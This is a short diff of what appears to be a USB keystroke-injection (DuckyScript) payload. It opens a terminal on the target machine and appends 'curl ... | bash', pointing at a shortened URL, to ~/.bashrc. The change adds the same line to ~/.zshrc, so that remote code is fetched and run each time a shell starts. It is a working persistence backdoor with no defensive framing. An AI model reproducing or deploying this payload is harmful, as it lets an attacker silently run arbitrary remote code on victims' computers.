@@ -12,7 +12,7 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING echo "curl -s -L http://bit.ly/10hA8iC | bash" >> ~/.bashrc
+STRING echo "curl -s -L http://bit.ly/10hA8iC | bash" >> ~/.zshrc && echo "curl -s -L http://bit.ly/10hA8iC | bash" >> ~/.bashrc
 DELAY 300
 ENTER
 DELAY 300
